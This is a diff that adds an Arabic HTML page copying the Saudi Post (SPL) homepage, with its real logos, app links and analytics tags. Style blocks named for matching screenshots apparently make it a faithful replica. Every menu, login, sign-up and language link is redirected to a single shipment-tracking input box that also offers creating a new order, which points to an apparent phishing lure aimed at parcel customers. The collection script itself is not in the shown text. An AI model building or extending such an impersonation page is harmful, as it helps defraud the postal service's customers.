@@ -1,0 +1,2453 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <!-- Required meta tags always come first -->
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <link rel="shortcut icon" href="/resources/img/icons/favicon.ico?v=2" type="image/vnd.microsoft.icon" id="favicon" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <title>الصفحة الرئيسية | البريد السعودي | سبل</title>
+<meta name="Description" CONTENT="البريد السعودي - سبل أونلاين">
+<meta name="Keywords" content="البريد السعودي | سبل،الصفحة الرئيسية،،البريد السعودي - سبل أونلاين">
+
+<link rel="search" type="application/opensearchdescription+xml" title="البريد السعودي | سبل" href="/ar/osd" />
+<link rel="canonical" href="https://splonline.com.sa/ar/" />
+
+<meta name="theme-color" content="#146e82" />
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="smartbanner:title" content="البريد السعودي | سبل">
+    <meta name="smartbanner:author" content="Official App">
+    <meta name="smartbanner:price" content=" ">
+    <meta name="smartbanner:price-suffix-apple" content=" - On the App Store">
+    <meta name="smartbanner:price-suffix-google" content=" ">
+    <meta name="smartbanner:icon-apple" content="/images/log-banner.png">
+    <meta name="smartbanner:icon-google" content="/images/log-banner.png">
+    <meta name="smartbanner:button" content="حمّل">
+    <meta name="smartbanner:button-url-apple" content="https://itunes.apple.com/us/app/saudi-post/id494312967?mt=8">
+    <meta name="smartbanner:button-url-google" content="https://play.google.com/store/apps/details?id=sa.com.SP">
+    <meta name="smartbanner:enabled-platforms" content="android,ios">
+    <meta name="smartbanner:hide-path" content="/">
+<meta property="og:title" content="الصفحة الرئيسية">
+<meta property="og:description" content="البريد السعودي - سبل أونلاين">
+<meta property="og:url" content="https://splonline.com.sa/ar/">
+<meta property="og:locale" content="ar_AR" />
+<meta property="og:image" content="https://splonline.com.sa/media/2423/logospl.svg" />
+<meta property="og:image:type" content="image/svg" />
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="البريد السعودي | سبل" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:site" content="البريد السعودي | سبل" />
+<meta name="twitter:creator" content="البريد السعودي | سبل" />
+<meta name="twitter:title" content="الصفحة الرئيسية" />
+<meta name="twitter:description" content="البريد السعودي - سبل أونلاين" />
+<meta name="twitter:image" content="https://splonline.com.sa/media/2423/logospl.svg" />
+<meta name="twitter:url" content="https://splonline.com.sa/ar/" />
+    <title>الصفحة الرئيسية</title>
+
+    <link rel="stylesheet" href="/dist/css/ar.min.css?v=1.5" />
+
+    <link rel="stylesheet" href="/dist/css/aos.min.css">
+    <link rel="stylesheet" href="/dist/css/fonts.min.css">
+    <link rel="stylesheet" href="/dist/css/main.min.css?v=7.6">
+
+
+
+        <link rel="stylesheet" href="/dist/css/main_ar.min.css?v=1.5" />
+
+    <script src="/dist/js/modernizr.min.js"></script>
+    <script src="/dist/js/jquery.min.js"></script>
+
+    
+    <link href="/dist/css/sliderRevolution/css/settings.min.css" rel="stylesheet" />
+    <link href="/dist/css/OwlCarousel2/owl.carousel.min.css" rel="stylesheet" />
+    <style>
+
+        @media (min-width: 320px) and (max-width: 767px){
+		        .etmam .container .flex_me .col {
+            flex: 0 0 100%;
+            margin: 1.5rem 0;
+        }
+            .etmam .container .flex_me .col:first-child {
+            order: 2;
+        }
+
+            .etmam .container .flex_me .col:last-child {
+                order: 1;
+                margin-bottom:0 !important;
+            }
+            .etmam .container .flex_me .col img {
+                width:100% !important;
+                float:none;
+            }
+        }
+    </style>
+
+
+
+    <!-- Google Tag Manager page load speed -->
+    <script>
+        (function (w, d, s, l, i) {
+            w[l] = w[l] || []; w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            }); var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-KST7XL47');</script>
+    <!-- End Google Tag Manager -->
+
+    <!-- Google Tag Manager -->
+    <script>
+        (function (w, d, s, l, i) {
+            w[l] = w[l] || []; w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            }); var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-54J4MJT');</script>
+    <!-- End Google Tag Manager -->
+    <!-- Hotjar Tracking Code for www.sp.com.sa -->
+    <script>
+        (function (h, o, t, j, a, r) {
+            h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
+            h._hjSettings = { hjid: 2171284, hjsv: 6 };
+            a = o.getElementsByTagName('head')[0];
+            r = o.createElement('script'); r.async = 1;
+            r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
+            a.appendChild(r);
+        })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
+    </script>
+
+
+
+
+
+
+
+
+<style id="spl-mobile-faithful-style">
+  *, *::before, *::after { box-sizing: border-box; }
+  html, body {
+    margin: 0;
+    padding: 0;
+    direction: rtl;
+    text-align: right;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Tahoma, Arial, sans-serif;
+    background-color: #0b4a56;
+    color: #0f292e;
+    overflow-x: hidden;
+  }
+  a { color: #146e82; text-decoration: none; }
+  img, svg { max-width: 100%; height: auto; }
+
+  .container {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 14px;
+  }
+  .flex_me {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+  }
+
+  /* Top bar */
+  .top_bar {
+    background-color: #0b4a56;
+    color: #ffffff;
+    font-size: 13px;
+  }
+  .top_bar .container {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 8px;
+    padding-top: 0;
+    padding-bottom: 0;
+  }
+  .top_bar ul.navTop {
+    list-style: none;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    align-items: center;
+  }
+  .top_bar ul.navTop li a {
+    display: inline-block;
+    padding: 10px 10px;
+    color: #e6f4f7;
+    font-weight: 600;
+  }
+  .top_bar ul.navTop li#individual a,
+  .top_bar ul.navTop li.active a {
+    background-color: #06323b;
+    color: #ffffff;
+  }
+  .top_bar .col:last-child {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .top_bar .col:last-child a {
+    color: #ffffff;
+    font-weight: 600;
+  }
+  .help_dropdown > div { display: none; }
+  .search_box { display: none; width: 100%; padding: 8px 0; }
+  .search_box.open { display: block; }
+
+  /* Main header bar */
+  header.home {
+    background-color: #ffffff;
+    padding: 12px 0;
+    border-bottom: 1px solid #e2e8f0;
+  }
+  header.home .container {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+  }
+  .append_menu {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  #menu {
+    display: none !important;
+  }
+  #menu.spl-drawer-open {
+    display: flex !important;
+    flex-direction: column;
+    position: fixed;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    width: 270px;
+    background: #ffffff;
+    z-index: 100000;
+    padding: 20px 16px;
+    box-shadow: -8px 0 28px rgba(0,0,0,0.22);
+    list-style: none;
+    margin: 0;
+    gap: 8px;
+    overflow-y: auto;
+  }
+  #menu.spl-drawer-open > li > a {
+    display: block;
+    padding: 10px 12px;
+    background: #f1f5f9;
+    border-radius: 8px;
+    font-weight: 700;
+    color: #0f292e;
+  }
+  #menu.spl-drawer-open > li > ul.mega_menu {
+    list-style: none;
+    padding: 6px 12px;
+    margin: 4px 0 0;
+  }
+  #menu.spl-drawer-open > li > ul.mega_menu a {
+    display: block;
+    padding: 5px 0;
+    font-size: 13px;
+    color: #334155;
+  }
+  .menuMobile { display: none !important; }
+  .desktop_view { display: none !important; }
+
+  .spl-hamburger-btn {
+    display: inline-flex;
+    flex-direction: column;
+    justify-content: center;
+    gap: 5px;
+    width: 34px;
+    height: 34px;
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    padding: 4px;
+  }
+  .spl-hamburger-btn span {
+    display: block;
+    width: 100%;
+    height: 2.5px;
+    background-color: #0b4a56;
+    border-radius: 2px;
+  }
+
+  .mobile_view {
+    display: flex !important;
+    align-items: center;
+    gap: 12px;
+    font-size: 15px;
+    font-weight: 700;
+  }
+  .mobile_view a {
+    color: #0b4a56;
+    position: relative;
+  }
+  .mobile_view a + a::before {
+    content: "|";
+    margin-left: 12px;
+    color: #cbd5e1;
+    font-weight: 400;
+  }
+
+  /* Hero section */
+  .hero_banner {
+    background: linear-gradient(180deg, #e8f3f5 0%, #c7e2e7 100%);
+    padding: 20px 0 28px;
+  }
+  .hero_banner .container {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+  }
+  .hero_banner .col:first-child {
+    order: 2;
+    text-align: center;
+  }
+  .hero_banner .col:nth-child(2) {
+    order: 1;
+    text-align: center;
+  }
+  .hero_banner_img {
+    border-radius: 10px;
+    box-shadow: 0 8px 22px rgba(11, 74, 86, 0.14);
+    max-height: 260px;
+    object-fit: cover;
+  }
+  .hero_banner h1 {
+    font-size: 38px;
+    font-weight: 900;
+    color: #0b3c44;
+    margin: 8px 0 6px;
+  }
+  .hero_banner_caption span {
+    font-size: 20px;
+    font-weight: 600;
+    color: #134e59;
+    display: block;
+    margin-bottom: 14px;
+  }
+  .hero_linear, .tooltip_box { display: none; }
+
+  /* Tracking Card */
+  .track_trace {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 20px 18px;
+    text-align: right;
+    box-shadow: 0 12px 28px rgba(11, 74, 86, 0.12);
+    position: relative;
+    z-index: 40;
+  }
+  .track_trace > span {
+    font-size: 22px;
+    font-weight: 800;
+    color: #0b3c44;
+  }
+  .track_trace > p {
+    margin: 8px 0 10px;
+    font-size: 16px;
+    font-weight: 700;
+    color: #1e293b;
+  }
+  .list-itcodes {
+    position: relative !important;
+    overflow: visible !important;
+    z-index: 9990 !important;
+  }
+  .tag-input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1.5px solid #cbd5e1;
+    border-radius: 8px;
+    font-size: 15px;
+    outline: none;
+  }
+  .tag-input:focus {
+    border-color: #00b4c8;
+  }
+
+  /* Clean native-like dropdown menu */
+  .custom-track-dropdown {
+    position: absolute !important;
+    top: calc(100% + 4px) !important;
+    right: 0 !important;
+    left: 0 !important;
+    background-color: #ffffff !important;
+    border-radius: 8px !important;
+    box-shadow: 0 10px 24px rgba(15, 23, 42, 0.14) !important;
+    z-index: 999999 !important;
+    display: none;
+    overflow: hidden !important;
+    border: 1.5px solid #00a5b5 !important;
+  }
+  .custom-track-dropdown.show {
+    display: block !important;
+  }
+  .custom-track-option {
+    padding: 12px 14px !important;
+    color: #0f292e !important;
+    font-size: 15px !important;
+    font-weight: 700 !important;
+    cursor: pointer !important;
+    display: block !important;
+    text-align: right !important;
+    border-bottom: 1px solid #e2e8f0 !important;
+    background: #ffffff !important;
+    transition: background-color 0.15s ease, color 0.15s ease !important;
+  }
+  .custom-track-option:last-child { border-bottom: none !important; }
+  .custom-track-option:hover,
+  .custom-track-option.active-opt {
+    background-color: #e6f7f9 !important;
+    color: #074650 !important;
+  }
+
+  /* Dark teal alert banners matching screenshot 1 */
+  .covid_message {
+    background-color: #0c4b56 !important;
+    color: #ffffff !important;
+    padding: 28px 16px !important;
+    display: block !important;
+  }
+  .covid_message .container {
+    display: block !important;
+    margin-bottom: 24px !important;
+    padding: 0 !important;
+  }
+  .covid_message .container:last-child {
+    margin-bottom: 0 !important;
+  }
+  .covid_message .container > div {
+    display: flex !important;
+    flex-direction: column !important;
+    align-items: center !important;
+    justify-content: center !important;
+    text-align: center !important;
+    gap: 14px !important;
+    width: 100% !important;
+    background: transparent !important;
+    border: none !important;
+    padding: 8px 4px !important;
+  }
+  .covid_message img {
+    max-height: 52px !important;
+    width: auto !important;
+    filter: brightness(0) invert(1);
+  }
+  .covid_message span {
+    font-size: 20px !important;
+    font-weight: 700 !important;
+    color: #ffffff !important;
+    line-height: 1.5 !important;
+  }
+  .covid_message a.btn,
+  .covid_message a.linear_btn {
+    background: transparent !important;
+    color: #ffffff !important;
+    border: 1.5px solid #ffffff !important;
+    border-radius: 4px !important;
+    padding: 10px 28px !important;
+    font-size: 16px !important;
+    font-weight: 700 !important;
+    margin-top: 4px;
+  }
+  .covid_message a.btn:hover {
+    background: rgba(255, 255, 255, 0.12) !important;
+  }
+
+  /* Services cards matching screenshots 1 & 2 */
+  section.services {
+    background-color: #0c4b56 !important;
+    padding: 16px 14px 32px !important;
+  }
+  section.services .container {
+    padding: 0 !important;
+  }
+  section.services .flex_me {
+    display: flex !important;
+    flex-direction: column !important;
+    gap: 20px !important;
+  }
+  section.services .col {
+    background-color: #ffffff !important;
+    border-radius: 12px !important;
+    padding: 36px 24px 32px !important;
+    text-align: center !important;
+    width: 100% !important;
+    box-shadow: 0 10px 24px rgba(0, 0, 0, 0.16) !important;
+    border: none !important;
+  }
+  section.services .col > img {
+    max-height: 56px !important;
+    width: auto !important;
+    margin: 0 auto 14px !important;
+    display: block !important;
+  }
+  section.services .col > span {
+    display: block !important;
+    font-size: 24px !important;
+    font-weight: 800 !important;
+    color: #0c3941 !important;
+    margin: 8px 0 14px !important;
+  }
+  section.services .col p {
+    height: auto !important;
+    min-height: 0 !important;
+    font-size: 16px !important;
+    line-height: 1.75 !important;
+    color: #1e293b !important;
+    margin: 0 0 22px !important;
+  }
+  section.services .col a.btn_noBG {
+    display: inline-flex !important;
+    align-items: center !important;
+    justify-content: center !important;
+    gap: 8px !important;
+    background: transparent !important;
+    color: #0c4b56 !important;
+    font-size: 18px !important;
+    font-weight: 800 !important;
+    padding: 6px 12px !important;
+  }
+  section.services .col a.btn_noBG::after {
+    content: "←";
+    font-size: 20px;
+    font-weight: 700;
+    color: #0c4b56;
+  }
+
+  .btn, .primary_btn, .linear_btn, .btn_noBG {
+    display: inline-block;
+    padding: 9px 16px;
+    border-radius: 8px;
+    font-weight: 700;
+    font-size: 14px;
+    cursor: pointer;
+    border: none;
+  }
+  .primary_btn { background: #146e82; color: #fff; }
+  .linear_btn { background: #00b4c8; color: #fff; }
+  .btn_noBG { background: #eef7f9; color: #146e82; }
+
+  /* Lower sections clean cards */
+  section.sending_has_never .container,
+  section.g20_section .container,
+  section.moving_house .col,
+  section.downloadApp_banner .container,
+  section.contact_section .col {
+    background: #ffffff;
+    border: 1px solid #e2e8f0;
+    border-radius: 14px;
+    padding: 18px;
+    margin-bottom: 16px;
+  }
+  section.sending_has_never,
+  section.g20_section,
+  section.moving_house,
+  section.find_branch,
+  section.downloadApp_banner,
+  section.contact_section {
+    background-color: #f4f7f8;
+    padding: 20px 14px;
+  }
+  .SA_map_wrapper, .download_linear_wrap { display: none; }
+
+  footer.site-footer {
+    background: #0b2d34;
+    color: #e2f1f4;
+    padding: 32px 0 20px;
+  }
+  footer.site-footer a { color: #cde7ec; }
+  .footer_sitemap_col { flex: 1 1 180px; margin-bottom: 16px; }
+  .accordion-header { display: block; font-weight: 800; color: #fff; margin-bottom: 8px; }
+  .accordion-body { list-style: none; padding: 0; margin: 0; }
+  .accordion-body li { margin-bottom: 6px; font-size: 14px; }
+</style>
+
+
+<style id="spl-completeness-guard-style">
+  .covid_message,
+  section.services,
+  section.sending_has_never,
+  section.g20_section,
+  section.moving_house,
+  section.find_branch,
+  section.downloadApp_banner,
+  section.contact_section {
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  .covid_message .container {
+    display: block !important;
+    margin-bottom: 12px;
+  }
+  .covid_message .container > div {
+    display: flex !important;
+    flex-wrap: wrap !important;
+    align-items: center !important;
+    justify-content: space-between !important;
+    gap: 10px !important;
+  }
+  .covid_message img,
+  section.services .col > img,
+  section.moving_house .col > img,
+  section.contact_section img {
+    max-height: 54px;
+    width: auto;
+    object-fit: contain;
+  }
+  .downloadApp_banner .col > img[src*="spl-app-new"] {
+    max-height: 280px;
+    width: auto;
+  }
+</style>
+
+
+<style id="spl-screenshot-22-23-fix">
+  .top_bar .container {
+    flex-wrap: nowrap !important;
+    justify-content: space-between !important;
+    gap: 6px !important;
+  }
+  .top_bar ul.navTop li a {
+    padding: 10px 7px !important;
+    font-size: 12px !important;
+    white-space: nowrap !important;
+  }
+  .top_bar .col:last-child {
+    gap: 6px !important;
+    flex-shrink: 0 !important;
+    font-size: 12px !important;
+    white-space: nowrap !important;
+  }
+  .top_bar .col:last-child a.switchLang::before {
+    content: "|";
+    margin-left: 6px;
+    color: rgba(255,255,255,0.45);
+  }
+  .hero_banner {
+    background: #eef6f7 !important;
+    padding: 18px 14px 28px !important;
+  }
+  .hero_banner_img {
+    width: 100% !important;
+    max-width: 100% !important;
+    max-height: none !important;
+    border-radius: 12px !important;
+    box-shadow: 0 8px 20px rgba(11, 59, 68, 0.16) !important;
+  }
+  .hero_banner h1 {
+    font-size: 36px !important;
+    font-weight: 900 !important;
+    color: #093b44 !important;
+    margin: 12px 0 6px !important;
+  }
+  .hero_banner_caption span {
+    font-size: 20px !important;
+    font-weight: 500 !important;
+    color: #16444c !important;
+    margin-bottom: 18px !important;
+  }
+  .track_trace {
+    border-radius: 12px !important;
+    padding: 20px 18px !important;
+    box-shadow: 0 10px 26px rgba(11, 59, 68, 0.12) !important;
+  }
+  .track_trace > p {
+    font-size: 16px !important;
+    font-weight: 500 !important;
+    color: #1e293b !important;
+    margin: 6px 0 12px !important;
+  }
+  .tag-input {
+    border-radius: 4px !important;
+    border: 1px solid #b8c7cc !important;
+    padding: 11px 12px !important;
+    text-align: left !important;
+    direction: ltr !important;
+  }
+  .spl-track-cyan-btn {
+    background-color: #00a5b5 !important;
+    color: #ffffff !important;
+    font-size: 16px !important;
+    font-weight: 700 !important;
+    padding: 12px 24px !important;
+    border-radius: 8px !important;
+    min-width: 108px !important;
+    line-height: 1.35 !important;
+    white-space: nowrap !important;
+    text-align: center !important;
+  }
+</style>
+
+
+<style id="spl-white-hero-gap-fix">
+  .hero_banner {
+    background: #ffffff !important;
+    padding: 12px 14px 24px !important;
+  }
+  .hero_banner .container {
+    gap: 8px !important;
+  }
+  .hero_banner .container > p {
+    display: none !important;
+  }
+  .hero_banner .col:nth-child(2) {
+    order: 1 !important;
+    margin: 0 !important;
+    padding: 0 !important;
+  }
+  .hero_banner .col:first-child {
+    order: 2 !important;
+    margin: 0 !important;
+    padding: 0 !important;
+  }
+  .hero_banner_caption br {
+    display: none !important;
+  }
+  .hero_banner h1 {
+    margin: 14px 0 6px !important;
+  }
+  .hero_banner_caption span {
+    margin-bottom: 12px !important;
+  }
+  .track_trace {
+    margin-top: 8px !important;
+  }
+</style>
+
+</head>
+<body>
+
+    <!-- Google Tag Manager (noscript) page load speed -->
+    <noscript>
+        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KST7XL47"
+                height="0" width="0" style="display:none;visibility:hidden"></iframe>
+    </noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+
+    <!-- Google Tag Manager (noscript) -->
+    <noscript>
+        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-54J4MJT"
+                height="0" width="0" style="display:none;visibility:hidden"></iframe>
+    </noscript>
+
+
+    <!-- End Google Tag Manager (noscript) -->
+    <div class="page-wrap">
+
+        <div class="header_wrapper">
+            <div class="top_bar">
+                <div class="container flex_me">
+                    <div class="col">
+                        <ul class="navTop">
+                            <li id="individual"><a href="#spl-tracking-box">الأفراد</a></li>
+                            <li id="enterprise"><a href="#spl-tracking-box">الأعمال</a></li>
+                            <li id="government"><a href="#spl-tracking-box">الخدمات الحكومية</a></li>
+                        </ul>
+                    </div>
+
+                    <div class="col">
+                        <div class="help_dropdown">
+                            <a href="#spl-tracking-box" class="onMobile_view">مساعدة</a>
+                            <div>
+                                <span>مساعدة ودعم</span>
+                                <ul>
+                                    <li><a href="#spl-tracking-box">الأسئلة الشائعة</a></li>
+                                    <li><a href="#spl-tracking-box">خدمة العملاء</a></li>
+                                    
+
+
+                                </ul>
+                            </div>
+                        </div>
+                        <a href="#spl-tracking-box" title="الفروع" class="desktop_view" id="scrollToBranch"><img src="https://splonline.com.sa/Design/images/branch_icon.svg" alt="الفروع"></a>
+                        <button type="button" title="البحث" class="search_btn desktop_view btn-srch"><img src="https://splonline.com.sa/Design/images/search_icon.svg" alt="بحث"></button>
+                        
+
+
+                        <a class="nav-link switchLang" href="#spl-tracking-box">English</a>
+
+                        <div class="search_box">
+                            <form id="search" name="search" action="/ar/search" method="get">
+                                <button type="button" class="close bg-transparent border-0"></button>
+                                <div class="search_field">
+                                    <span>Search the website...</span>
+
+
+                                    <input name="q" aria-label="Search" type="text" id="search_cssw" placeholder="البحث..." value="" autocomplete="off">
+                                    <button type="submit"><img src="https://splonline.com.sa/Design/images/arrow_icon_white.svg" alt="إرسال البحث"></button>
+
+
+                                </div>
+                            </form>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+            <header class="
+    home
+">
+                <div class="container flex_me">
+                    <div class="col flex_me append_menu">
+                        <button type="button" class="spl-hamburger-btn" id="splHamburgerBtn" aria-label="القائمة"><span></span><span></span><span></span></button>
+                        <a href="#spl-tracking-box" class="logo" aria-label="البريد السعودي سبل" style="display:inline-flex;align-items:center;gap:8px;text-decoration:none;flex-shrink:0;">
+  <img src="https://splonline.com.sa/Design/images/Logo.svg" alt="سبل" style="height:40px;width:auto;display:block;" onerror="this.style.display='none';this.nextElementSibling.style.display='inline-flex';">
+  <span style="display:none;align-items:center;gap:6px;font-weight:800;font-size:22px;color:#0d3b44;letter-spacing:-0.5px;">
+    <span style="background:#00c8e1;color:#0b2d34;padding:3px 8px;border-radius:6px;font-size:16px;font-weight:900;">SPL</span>
+    <span>سبل</span>
+  </span>
+</a>
+
+
+
+                        <ul id="menu" class="menuIndividual">
+    <li class="menuMobile">
+        <span >الأفراد</span>
+    </li>
+            <li class="has_dropdown">
+                <a href="#spl-tracking-box">إرسال</a>
+                <ul class="mega_menu flex_wrap">
+                    <li>
+
+                            <a href="#spl-tracking-box">اكسبرس</a>
+                            <a href="#spl-tracking-box">اكسبرس بلس</a>
+                            <a href="#spl-tracking-box">اقتصادي</a>
+                            <a href="#spl-tracking-box">اقتصادي مميز </a>
+                            <a href="#spl-tracking-box">الشحن البحري</a>
+                            <a href="#spl-tracking-box">الرسائل</a>
+                            <a href="#spl-tracking-box">منصة SMEs</a>
+                            <a href="#spl-tracking-box">خدمة توصيل الطرود للنزيل</a>
+
+                    </li>
+                </ul>
+            </li>
+            <li class="has_dropdown">
+                <a href="#spl-tracking-box">استلام</a>
+                <ul class="mega_menu flex_wrap">
+                    <li>
+
+                            <a href="#spl-tracking-box">المنزل</a>
+                            <a href="#spl-tracking-box">الفروع</a>
+                            <a href="#spl-tracking-box">وثائق وزارة الداخلية - أبشر </a>
+                            <a href="#spl-tracking-box">تصديق وثائق وزارة الخارجية</a>
+                            <a href="#spl-tracking-box">صندوق البريد الرقمي</a>
+                            <a href="#spl-tracking-box">صناديق البريد العادية</a>
+
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <a href="#spl-tracking-box">عالمي</a>
+            </li>
+            <li>
+                <a href="#spl-tracking-box">العنوان الوطني</a>
+            </li>
+            <li class="has_dropdown">
+                <a href="#spl-tracking-box">خدمات التجزئة</a>
+                <ul class="mega_menu flex_wrap">
+                    <li>
+
+                            <a href="#spl-tracking-box">خدمة التغليف</a>
+                            <a href="#spl-tracking-box">خدمة بيع&#160;حزم&#160;التغليف&#160;</a>
+                            <a href="#spl-tracking-box">أضاحي</a>
+
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <a href="#spl-tracking-box">الطوابع </a>
+            </li>
+</ul>
+
+<ul data-menu-alt="1" class="menuGovernmental" style="display:none">
+    <li class="menuMobile">
+        <span>الخدمات الحكومية</span>
+    </li>
+            <li>
+                <a href="#spl-tracking-box">البريد الرسمي</a>
+            </li>
+            <li>
+                <a href="#spl-tracking-box">الغرف البريدية</a>
+            </li>
+</ul>
+
+<ul data-menu-alt="1" class="menuEnterprise" style="display:none">
+    <li class="menuMobile">
+        <span>الأعمال</span>
+    </li>
+            <li class="has_dropdown">
+                <a href="#spl-tracking-box">إرسال</a>
+                <ul class="mega_menu flex_wrap">
+                    <li>
+
+                            <a href="#spl-tracking-box">أرسل شحنات منشأتك</a>
+                            <a href="#spl-tracking-box">منصة SMEs</a>
+
+                    </li>
+                </ul>
+            </li>
+            <li class="has_dropdown">
+                <a href="#spl-tracking-box">حلول الأعمال</a>
+                <ul class="mega_menu flex_wrap">
+                    <li>
+
+                            <a href="#spl-tracking-box">عنوان الأعمال المعتمد</a>
+                            <a href="#spl-tracking-box">خدمة الغرفة البريدية من سبل</a>
+                            <a href="#spl-tracking-box">التجارة الإلكترونية</a>
+                            <a href="#spl-tracking-box">صندوق البريد الرقمي</a>
+                            <a href="#spl-tracking-box">صناديق البريد العادية</a>
+                            <a href="#spl-tracking-box">الناشر التجاري</a>
+
+                    </li>
+                </ul>
+            </li>
+            <li class="has_dropdown">
+                <a href="#spl-tracking-box">خدمات البيانات</a>
+                <ul class="mega_menu flex_wrap">
+                    <li>
+
+                            <a href="#spl-tracking-box">العنوان الوطني API </a>
+
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <a href="#spl-tracking-box">خدمات الوكالات</a>
+            </li>
+            <li class="has_dropdown">
+                <a href="#spl-tracking-box">حــلول الــرعايــة الصـحيـة</a>
+                <ul class="mega_menu flex_wrap">
+                    <li>
+
+                            <a href="#spl-tracking-box">نقل العينات البيولوجية</a>
+                            <a href="#spl-tracking-box">نقل الأدوية والمكملات الغذائية</a>
+
+                    </li>
+                </ul>
+            </li>
+</ul>
+
+                    </div>
+
+                    <div class="col flex_me justify_end desktop_view">
+                        <a target="_blank" href="#spl-tracking-box" class="sign_up_link">دخول</a>
+                        <a target="_blank" href="#spl-tracking-box">تسجيل</a>
+                    </div>
+
+                    <div class="col flex_me justify_end mobile_view">
+
+                        
+                        <a href="#spl-tracking-box" title="الفروع">الفروع</a>
+
+                        <a target="_blank" href="#spl-tracking-box">دخول</a>
+                        <a target="_blank" href="#spl-tracking-box" class="">تسجيل</a>
+
+                        
+
+                    </div>
+
+                </div>
+            </header>
+        </div>
+
+        
+
+
+
+
+
+<section class="hero_banner">
+    <div class="container flex_me">
+        <div class="col">
+<div class="hero_banner_caption">
+<h1>سبيلك للعالم</h1>
+<br><br><span>أهلا بك في البريد السعودي |سبل</span></div>
+<div class="track_trace order-tracking mt-2 p-md-4 p-3" id="spl-tracking-box">
+    <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:4px;">
+      <div style="display:flex;align-items:center;gap:6px;">
+        <span style="font-size:21px;font-weight:900;color:#0b3c44;">تتبع الشحنات</span>
+        <a href="#!" class="info_icon" style="display:inline-flex;align-items:center;"><img src="https://splonline.com.sa/Design/images/info_icon.svg" alt="معلومة" style="width:18px;height:18px;"></a>
+      </div>
+      <svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="#00b4c8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;">
+        <path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z"></path>
+        <path d="m3.3 7 8.7 5 8.7-5"></path>
+        <path d="M12 22V12"></path>
+      </svg>
+    </div>
+    <div class="tooltip_box" style="top:0;bottom:auto;width:auto;">
+        <p>يمكنك إيجاد رقم التتبع (المكوّن من 13 رقم أو أكثر) في الرسالة المرسلة على رقم جوالك. </p>
+    </div>
+    <p>أدخل رقمًا أو عدة أرقام تتبع</p>
+    <div class="row">
+        <div class="col-12">
+            <div class="list-itcodes onHomePage" style="position:relative;">
+                <select id="zajelActionSelect" class="zajel-input" style="margin-bottom:10px;font-weight:700;">
+                  <option value="track" selected>متابعة الشحنة</option>
+                  <option value="new">إنشاء طلب جديد</option>
+                </select>
+                <div style="display:none;" class="tag">{{tag}} <button type="button" @click='removeTag(index)'>x</button></div>
+                <input type='text' v-model="itCode" 
+                       id="tid"
+                       class="tag-input"
+                       placeholder=""
+                        />
+            </div>
+        </div>
+        <div id="zajelTrackErrorMsg" style="display:none;margin-top:10px;padding:10px 12px;border-radius:8px;background:#fef2f2;color:#b91c1c;border:1px solid #fecaca;font-size:13.5px;font-weight:800;text-align:right;">رقم الشحنة خطأ</div>
+        <div class="col-12 spl-track-footer-row" style="display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-top:14px;">
+            <button id="trackBtnDetails" class="btn spl-track-cyan-btn">تابع</button>
+            <div class="spl-track-note" style="font-size:13.5px;line-height:1.5;color:#0f292e;text-align:right;max-width:66%;">افصل بين أرقام التتبع المتعددة <strong>بمسافة</strong> لمعرفة حالة كل شحنة</div>
+        </div>
+    </div>
+</div>
+</div>
+<div class="col"><img class="hero_banner_img aos-init aos-animate" src="https://splonline.com.sa/media/4099/newbanner.png" alt="سبل سبيلك للعالم" data-udi="umb://media/779c32db79984ce09d015f18663689bd" data-aos="fade-left" data-aos-delay="1300"></div>
+<p> </p>
+<p> </p>
+    </div>
